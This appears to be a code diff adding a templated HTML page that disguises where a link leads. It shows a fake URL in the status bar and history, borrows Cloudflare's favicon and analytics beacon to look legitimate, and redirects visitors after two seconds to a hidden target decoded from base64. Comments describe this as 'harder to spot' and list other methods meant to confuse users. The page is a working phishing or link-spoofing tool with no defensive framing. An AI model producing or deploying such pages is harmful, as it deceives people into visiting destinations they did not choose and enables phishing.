@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ display_text }}</title>
+    
+    <!-- Fake favicon from Cloudflare -->
+    <link rel="icon" href="https://www.cloudflare.com/img/favicon-cloudflare.png" type="image/png">
+    
+    <!-- Fake meta tags -->
+    <meta property="og:title" content="{{ display_text }}">
+    <meta property="og:url" content="{{ display_url }}">
+    <meta name="twitter:card" content="summary">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f38020;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .url-display {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #f8f8f8;
+            border-radius: 6px;
+            word-break: break-all;
+        }
+        .url-display a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #f38020;
+            animation: progress 2s ease-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .note {
+            font-size: 12px;
+            color: #999;
+        }
+        
+        /* Hidden real URL in status bar */
+        .fake-link {
+            color: #0066cc;
+            cursor: pointer;
+        }
+    </style>
+    
+    <!-- JavaScript to manipulate status bar and history -->
+    <script>
+        // Override status bar text
+        window.status = "{{ display_url }}";
+        
+        // Manipulate browser history
+        history.replaceState({}, "{{ display_text }}", "{{ display_url }}");
+        
+        // Fake the URL in address bar (doesn't work, but looks convincing)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update any displayed URLs
+            document.querySelectorAll('.url-display').forEach(el => {
+                el.innerHTML = el.innerHTML.replace(/{{ target_url }}/g, '{{ display_url }}');
+            });
+        });
+    </script>
+</head>
+<body onmouseover="window.status='{{ display_url }}'; return true;">
+    <div class="container">
+        <div class="spinner"></div>
+        
+        <h1>{{ display_text }}</h1>
+        
+        <div class="url-display">
+            <a href="{{ display_url }}" 
+               onmouseover="window.status='{{ display_url }}'; return true;"
+               onclick="window.location='{{ target_url }}'; return false;">
+                {{ display_url }}
+            </a>
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <p class="note">Redirecting to {{ display_text }}...</p>
+        
+        <!-- Hidden: Real redirect happens here -->
+        <script>
+            // Method 1: Meta refresh (visible in source)
+            // setTimeout(() => { window.location = '{{ target_url }}'; }, 2000);
+            
+            // Method 2: Encoded redirect (harder to spot)
+            setTimeout(function() {
+                var t = atob('{{ target_url | b64encode }}');
+                window.location = t;
+            }, 2000);
+            
+            // Method 3: Multiple redirects to confuse
+            // setTimeout(() => window.location = '/intermediate', 1000);
+            // setTimeout(() => window.location = '{{ target_url }}', 2000);
+        </script>
+    </div>
+    
+    <!-- Fake Cloudflare analytics (makes it look legitimate) -->
+    <script>
+        (function(){
+            var fake = document.createElement('script');
+            fake.src = 'https://static.cloudflareinsights.com/beacon.min.js';
+            document.body.appendChild(fake);
+        })();
+    </script>
+</body>
+</html>
